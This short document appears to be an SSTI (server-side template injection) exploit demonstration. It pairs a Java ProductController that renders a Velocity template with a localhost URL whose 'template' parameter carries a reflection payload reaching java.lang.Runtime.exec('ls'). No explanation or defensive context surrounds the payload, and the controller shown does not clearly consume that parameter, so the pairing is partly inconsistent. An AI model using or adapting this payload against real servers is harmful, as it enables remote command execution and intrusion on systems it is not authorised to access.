source code:

```
public class ProductController extends BaseController {
    public void show(Map<String, Object> context) {
        int productId = Integer.parseInt(request.getParameter("productId"));
        Product product = productService.getProductById(productId);

        String template = "#set($page='Product Detail')\n" +
                "<html>\n" +
                "<body>\n" +
                "<h1>$esc.html($page)</h1>\n" +
                "<h2>$esc.html($product.name)</h2>\n" +
                "<p>$esc.html($product.description)</p>\n" +
                "<p>Price: $esc.html($product.price)</p>\n" +
                "</body>\n" +
                "</html>";

        context.put("product", product);
        context.put("template", template);
        render("product_detail.vm", context);
    }
}
```

```http://localhost:8080/product?productId=1&template=$class.inspect().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ls').toString()```
